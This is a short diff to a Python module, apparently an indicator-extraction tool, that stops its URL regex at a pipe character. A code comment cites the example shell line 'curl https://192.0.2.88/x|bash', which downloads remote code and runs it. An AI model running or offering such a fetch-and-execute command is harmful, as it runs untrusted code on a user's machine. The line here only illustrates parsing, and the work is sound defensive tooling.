@@ -50,7 +50,9 @@ REQUEST_TIMEOUT = 30.0  # seconds
 # addresses only; standalone bare-domain scanning is skipped because dotted code
 # identifiers (e.g. System.Net.WebClient) are indistinguishable from domains
 # without a TLD list (future work).
-_URL_RE = re.compile(r"""https?://[^\s"'<>)\]}]+""", re.IGNORECASE)
+# "|" is excluded: it must be %-encoded in a URL (RFC 3986), and in shell samples it
+# is pipe syntax -- "curl https://192.0.2.88/x|bash" ends the URL at the pipe.
+_URL_RE = re.compile(r"""https?://[^\s"'<>)\]}|]+""", re.IGNORECASE)
 _IPV4_RE = re.compile(r"\b(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)\b")
 _EMAIL_RE = re.compile(r"[a-z0-9._%+-]+@([a-z0-9.-]+\.[a-z]{2,63})", re.IGNORECASE)
 # Domain label/TLD shape (LDH); validates domain input (DomainLookupInput).
